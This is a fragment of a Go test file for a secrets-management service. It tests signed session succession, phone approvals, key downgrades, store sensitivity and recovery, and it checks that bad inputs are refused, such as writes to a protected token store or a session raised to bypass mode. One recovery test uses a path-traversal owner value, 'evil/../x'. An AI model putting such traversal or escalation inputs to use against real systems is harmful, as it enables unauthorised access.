	if _, err := c.PullSecrets(&c2, ""); err != nil {
		t.Fatal(err)
	}
	// not zero, not two, not a swap, not a different harness
	for _, bad := range []SuccessionInput{
		{Predecessor: &cert, Machine: id, Stores: []string{"default"}},
		{Predecessor: &c2, Machine: id, Stores: []string{"claude", "default", "gmail", "openrouter"}},
		{Predecessor: &cert, Machine: id, Stores: []string{"gmail"}},
		{Predecessor: &cert, Machine: id, Stores: set, Options: Options{Harness: "opencode"}},
	} {
		if ch, err := routerSuccession(c, bad); err == nil {
			if _, err := c.ApproveByPhone(&ch, p.sign(ch.Payload), "", nil); err == nil {
				t.Fatalf("accepted %v", bad.Stores)
			}
		}
	}
	// a killed machine can't grow its set, and a resume from it keeps the grown set automatically
	c.KillWithSnapshot(id, nil)
	chr, _ := routerSuccession(c, SuccessionInput{Predecessor: &c2, Image: f.machineImage(c, &c2), Stores: set})
	a, err := c.ApproveByDeadMachine(&chr)
	if err != nil {
		t.Fatal(err)
	}
	start(t, c, a)
}

func (f *fakeFly) machineImage(c *Core, cert *SignedDoc) string {
	var cc Cert
	json.Unmarshal([]byte(cert.Payload), &cc)
	return cc.Machine.Image
}

func TestSensitivityOnlyGrows(t *testing.T) {
	c, _, p := setup(t)
	// create: once, empty, not sensitive; a write keeps it so
	pl(t)(c.CreateStore("notes"))
	if _, err := c.CreateStore("notes"); err == nil {
		t.Fatal("created a store twice")
	}
	if _, err := c.CreateStore("gmail"); err == nil {
		t.Fatal("re-created a sensitive store as not sensitive")
	}
	if _, err := c.CreateStore(FlyStore); err == nil {
		t.Fatal("created the Fly store")
	}
	if _, err := c.UnlockBegin("notes", ""); err == nil {
		t.Fatal("unlocked an empty store")
	}
	if w := pl(t)(writeStore(t, c, p, "notes", map[string]string{"N": "1"})); w["sensitive"] != false {
		t.Fatalf("got %v", w)
	}
	// a store the core never created is sensitive
	if w := pl(t)(writeStore(t, c, p, "fresh", map[string]string{"F": "1"})); w["sensitive"] != true {
		t.Fatalf("got %v", w)
	}
	// the one-way upgrade
	pl(t)(c.MarkSensitive("notes"))
	if d := pl(t)(c.MarkSensitive("notes")); d["already"] != true || c.notSensitive["notes"] {
		t.Fatalf("a second mark: %v", d)
	}
	if _, err := c.CreateStore("notes"); err == nil {
		t.Fatal("downgraded by re-creating")
	}
	// the phone reads sensitivity from the signed store list (the challenge names the stores only)
	marked := []string{}
	for _, r := range pl(t)(c.Stores("n"))["stores"].([]any) {
		if r.(map[string]any)["sensitive"] == true {
			marked = append(marked, r.(map[string]any)["name"].(string))
		}
	}
	if fmt.Sprint(marked) != "[fresh gmail notes]" {
		t.Fatalf("sensitive %v", marked)
	}
	if _, err := writeStore(t, c, p, FlyStore, map[string]string{"FLY_API_TOKEN": "evil"}); err == nil {
		t.Fatal("wrote the Fly store")
	}
	if _, err := routerSuccession(c, SuccessionInput{Image: img, Stores: []string{FlyStore}}); err == nil {
		t.Fatal("the Fly store went to a session")
	}
}

// the machine's side of a downgrade: a new key pair, and the challenge signed with its current key
func TestDowngradeInPlace(t *testing.T) {
	c, f, p := setup(t)
	cert, id := newLine(t, c, p, "default", "gmail")
	unlock(t, c, p, "default")
	unlock(t, c, p, "gmail")
	m := f.machines[id]
	oldSigner := &phone{sig: ecdsaFromECDH(m.sig)}
	nEnc, _ := ecdh.P256().GenerateKey(rand.Reader)
	nSig, _ := ecdh.P256().GenerateKey(rand.Reader)
	in := SuccessionInput{Predecessor: &cert, Machine: id, Stores: []string{"default"},
		NewEncryptionKey: b64.EncodeToString(nEnc.PublicKey().Bytes()), NewSigningKey: b64.EncodeToString(nSig.PublicKey().Bytes())}
	for _, bad := range []SuccessionInput{
		{Predecessor: &cert, Machine: id, Stores: []string{"default", "claude"}, NewEncryptionKey: in.NewEncryptionKey, NewSigningKey: in.NewSigningKey},
		{Predecessor: &cert, Machine: id, Stores: []string{"default"}, NewEncryptionKey: m2k(m.enc), NewSigningKey: m2k(m.sig)},
	} {
		if _, err := routerSuccession(c, bad); err == nil {
			t.Fatalf("accepted %+v", bad.Stores)
		}
	}
	ch, err := routerSuccession(c, in)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := c.ApproveByOldKey(&ch, newPhone().sign(ch.Payload), ""); err == nil {
		t.Fatal("a downgrade to someone else's keys was accepted")
	}
	if _, err := c.ApproveByDeadMachine(&ch); err == nil {
		t.Fatal("approve_by_dead_machine approved a downgrade")
	}
	cert2, err := c.ApproveByOldKey(&ch, oldSigner.sign(ch.Payload), "")
	if err != nil {
		t.Fatal(err)
	}
	// the new cert pulls only the subset, sealed to the new key
	d := pl(t)(c.PullSecrets(&cert2, ""))
	var out struct{ Sealed Sealed }
	b, _ := json.Marshal(d)
	json.Unmarshal(b, &out)
	plain, err := OpenSealed(nEnc, out.Sealed, "jarvis2/secrets")
	if err != nil {
		t.Fatal("not sealed to the new key")
	}
	if strings.Contains(string(plain), "secret") {
		t.Fatal("gmail still came through")
	}
	// a further downgrade must be signed with the NEW key (the one in the cert it continues)
	n2, _ := ecdh.P256().GenerateKey(rand.Reader)
	n3, _ := ecdh.P256().GenerateKey(rand.Reader)
	ch2, err := routerSuccession(c, SuccessionInput{Predecessor: &cert2, Machine: id, Stores: []string{}, NewEncryptionKey: m2k(n2), NewSigningKey: m2k(n3)})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := c.ApproveByOldKey(&ch2, oldSigner.sign(ch2.Payload), ""); err == nil {
		t.Fatal("the old key signed for a cert that names the new one")
	}
	if _, err := c.ApproveByOldKey(&ch2, (&phone{sig: ecdsaFromECDH(nSig)}).sign(ch2.Payload), ""); err != nil {
		t.Fatal(err)
	}
}

func m2k(k *ecdh.PrivateKey) string { return b64.EncodeToString(k.PublicKey().Bytes()) }

func ecdsaFromECDH(k *ecdh.PrivateKey) *ecdsa.PrivateKey {
	x, y := elliptic.Unmarshal(elliptic.P256(), k.PublicKey().Bytes())
	d := new(big.Int).SetBytes(k.Bytes())
	return &ecdsa.PrivateKey{PublicKey: ecdsa.PublicKey{Curve: elliptic.P256(), X: x, Y: y}, D: d}
}

// a machine checks grants itself (docs/DESIGN.md "Grants"): its cert names the phone's signing key and whether
// any of its stores is sensitive
func TestCertCarriesThePhoneAndSensitivity(t *testing.T) {
	c, _, p := setup(t)
	cert, _ := newLine(t, c, p, "default", "claude")
	m := pl(t)(cert, nil)
	if m["phone"] != p.signingKey() || m["sensitive"] != false {
		t.Fatalf("phone %v sensitive %v", m["phone"] == p.signingKey(), m["sensitive"])
	}
	cert, _ = newLine(t, c, p, "default", "gmail")
	if m := pl(t)(cert, nil); m["sensitive"] != true {
		t.Fatal("a line with gmail (sensitive) isn't marked sensitive")
	}
}

func TestTheLineIdSurvivesResume(t *testing.T) {
	c, _, p := setup(t)
	cert, first := newLine(t, c, p, "default")
	if m := pl(t)(cert, nil); m["line"] != first {
		t.Fatalf("a new line's id is its first machine: %v vs %s", m["line"], first)
	}
	var oc Cert
	json.Unmarshal([]byte(cert.Payload), &oc)
	c.KillWithSnapshot(first, nil)
	ch, _ := routerSuccession(c, SuccessionInput{Predecessor: &cert, Image: oc.Machine.Image, Stores: []string{"default"}})
	a, _ := c.ApproveByDeadMachine(&ch)
	cert2, second := start(t, c, a)
	if m := pl(t)(cert2, nil); m["line"] != first || second == first {
		t.Fatalf("the successor's line is %v, want %s", m["line"], first)
	}
}

func TestRaisingToBypassOnResumeNeedsThePhone(t *testing.T) {
	c, _, p := setup(t)
	cert, first := newLine(t, c, p, "default")
	if m := pl(t)(cert, nil); m["options"].(map[string]any)["permissionMode"] != "auto" {
		t.Fatalf("a line without a mode is auto: %v", m["options"])
	}
	var oc Cert
	json.Unmarshal([]byte(cert.Payload), &oc)
	c.KillWithSnapshot(first, nil)
	ch, _ := routerSuccession(c, SuccessionInput{Predecessor: &cert, Image: oc.Machine.Image, Stores: []string{"default"},
		Options: Options{Harness: "claude", PermissionMode: "bypass"}})
	if _, err := c.ApproveByDeadMachine(&ch); err == nil {
		t.Fatal("a dead machine approved raising the mode to bypass")
	}
	a := pl(t)(c.ApproveByPhone(&ch, p.sign(ch.Payload), "", nil))
	if a["kind"] != "approval" {
		t.Fatalf("the phone's approval: %v", a)
	}
}

// two identical new-session requests are two sessions: each challenge has its own nonce, so both start
func TestTwoIdenticalNewSessionsBothStart(t *testing.T) {
	c, _, p := setup(t)
	newLine(t, c, p, "default")
	newLine(t, c, p, "default")
}

func machineOf(started SignedDoc) string {
	var x struct{ Machine StartedMachine }
	json.Unmarshal([]byte(started.Payload), &x)
	return x.Machine.ID
}

func TestStartIsOneCreateAndInitWaitsForFly(t *testing.T) {
	c, f, _ := setup(t)
	if _, err := c.Start(StartRequest{Image: img, Size: "huge"}); err == nil {
		t.Fatal("started an unknown size (no silent default)")
	}
	if _, err := c.Start(StartRequest{Image: img}); err == nil {
		t.Fatal("started with no size")
	}
	pl(t)(c.Start(StartRequest{Image: img, Size: "large"}))
	if f.guest["memory_mb"] != 8192 {
		t.Fatalf("guest: %v", f.guest)
	}
	f.booting = true
	cr := pl(t)(c.Start(StartRequest{Image: img, Size: "small"}))
	id := cr["id"].(string)
	if _, err := c.Init(id); err == nil || err.(*Err).Status != 409 {
		t.Fatalf("init of a booting machine: %v", err)
	}
	f.machines[id].state = "started"
	st := pl(t)(c.Init(id))
	m := st["machine"].(map[string]any)
	if st["kind"] != "started" || m["requested"] != img || m["image"] != f.machines[id].image || m["signingKey"] == "" {
		t.Fatalf("started: %v", st)
	}
}

func TestKillIsOneDestroyConfirmedByFly(t *testing.T) {
	c, f, p := setup(t)
	_, id := newLine(t, c, p, "default")
	f.slowKill = true
	if _, err := c.KillWithSnapshot(id, nil); err == nil || err.(*Err).Status != 409 {
		t.Fatalf("killed before Fly reported destroyed: %v", err)
	}
	if c.isKilled(id) {
		t.Fatal("marked killed without Fly")
	}
	f.machines[id].state = "destroyed"
	k := pl(t)(c.KillWithSnapshot(id, nil))
	if k["kind"] != "killed" || !c.isKilled(id) {
		t.Fatalf("kill: %v", k)
	}
	if _, ok := c.signing[id]; ok {
		t.Fatal("a killed machine's key is still kept")
	}
	pl(t)(c.KillWithSnapshot(id, nil)) // again: the same answer
}

// R2: one route per fact — the keys only from /identity (with the box signature), the master's claim kept by the
// router, no free-text log, no input-log readback
func TestTheCoreHasNoDuplicateOrReadbackRoutes(t *testing.T) {
	c, _, _ := setup(t)
	srv := httptest.NewServer(Handler(c))
	defer srv.Close()
	for _, p := range []string{"GET /key", "GET /core-cert", "POST /log"} {
		m, path, _ := strings.Cut(p, " ")
		req, _ := http.NewRequest(m, srv.URL+path, nil)
		resp, err := http.DefaultClient.Do(req)
		if err != nil || resp.StatusCode != 404 {
			t.Fatalf("%s: %v %v", p, err, resp)
		}
	}
}

// routerSuccession: Succession as the router calls it — it fills in the defaults (harness, permission mode), sorts the
// stores and salts a new line; the core takes exact values only
func routerSuccession(c *Core, in SuccessionInput) (SignedDoc, error) {
	if in.Image != NullImage {
		if in.Options.Harness == "" {
			in.Options.Harness = "claude"
		}
		if in.Options.PermissionMode != "bypass" {
			in.Options.PermissionMode = "auto"
		}
	}
	set := map[string]bool{}
	stores := []string{}
	for _, n := range in.Stores {
		if !set[n] {
			set[n] = true
			stores = append(stores, n)
		}
	}
	sort.Strings(stores)
	in.Stores = stores
	if in.Predecessor == nil && in.Salt == "" {
		in.Salt = randID()
	}
	return c.Succession(in)
}

func TestSuccessionTakesExactValuesOnly(t *testing.T) {
	c, _, _ := setup(t)
	good := SuccessionInput{Image: img, Stores: []string{"default", "gmail"}, Options: Options{Harness: "claude", PermissionMode: "auto"}, Salt: randID()}
	for name, bad := range map[string]func(*SuccessionInput){
		"no harness":      func(in *SuccessionInput) { in.Options.Harness = "" },
		"no mode":         func(in *SuccessionInput) { in.Options.PermissionMode = "" },
		"another mode":    func(in *SuccessionInput) { in.Options.PermissionMode = "yolo" },
		"unsorted stores": func(in *SuccessionInput) { in.Stores = []string{"gmail", "default"} },
		"a store twice":   func(in *SuccessionInput) { in.Stores = []string{"default", "default"} },
		"no salt":         func(in *SuccessionInput) { in.Salt = "" },
		"a short salt":    func(in *SuccessionInput) { in.Salt = "abcd" },
		"a salt not hex":  func(in *SuccessionInput) { in.Salt = strings.Repeat("z", 32) },
	} {
		in := good
		in.Stores = append([]string{}, good.Stores...)
		bad(&in)
		if _, err := c.Succession(in); err == nil {
			t.Fatalf("%s: answered", name)
		}
	}
	ch := pl(t)(c.Succession(good))
	r := ch["request"].(map[string]any)
	if r["salt"] != good.Salt || r["options"].(map[string]any)["permissionMode"] != "auto" {
		t.Fatalf("got %v", r)
	}
}

// R2: a Recover whose stores the app wrapped itself (to the store key): the core never sees their plaintext
func TestARecoverOfAppWrappedStores(t *testing.T) {
	c, f, master := newCore(t)
	p := newPhone()
	sk := pl(t)(c.StoreKey(p.agreementKey(), "")) // open on an empty core: the app asks before it claims
	if sk["storeKey"] == "" {
		t.Fatal("no store key")
	}
	keys := append(append(appWrap(t, c, p, "default", testValues["default"]), appWrap(t, c, p, "gmail", testValues["gmail"])...),
		appWrap(t, c, p, "github-x", map[string]string{"K": "v"})...)
	keys[0].Writer = &EntryWriter{By: "setup", Sig: "ignored"}
	nb := claimBundle{Format: "keys", Stores: []string{"default", "empty", "github-x", "gmail"}, Keys: keys, NotSensitive: []string{"default"},
		FlyToken: "fly-secret", Owners: map[string]string{"github-x": "DE0CH/x", "default": "evil/../x"}}
	for name, bad := range map[string]claimBundle{
		"the Fly store":       {Format: "keys", Stores: []string{FlyStore}, Keys: appWrap(t, c, p, FlyStore, map[string]string{"FLY_API_TOKEN": "x"})},
		"a key of no store":   {Format: "keys", Stores: []string{"default"}, Keys: appWrap(t, c, p, "gmail", testValues["gmail"])},
		"the old blob format": {Format: "blobs", Stores: []string{"default"}},
	} {
		s, sig, b := claimFor(c, master, p, bad)
		if _, err := c.Claim(s, sig, b); err == nil {
			t.Fatalf("claimed with %s", name)
		}
	}
	s, sig, b := claimFor(c, master, p, nb)
	pl(t)(c.Claim(s, sig, b))
	if f.token != "fly-secret" || c.repoOwner["github-x"] != "DE0CH/x" || len(c.repoOwner) != 1 {
		t.Fatalf("token %q owners %v", f.token, c.repoOwner)
	}
	if !c.notSensitive["default"] || c.notSensitive["gmail"] || c.stores["default"]["A"].Writer.By != "core" || c.stores["default"]["A"].Writer.Sig != "" {
		t.Fatal("sensitivity or writer not as the master key signed them")
	}
	if keys, ok := c.stores["empty"]; !ok || len(keys) != 0 {
		t.Fatal("an empty store didn't come back empty")
	}
	if v := storeValues(t, c, p, "gmail"); v["G"] != testValues["gmail"]["G"] {
		t.Fatalf("got %v", v)
	}
}
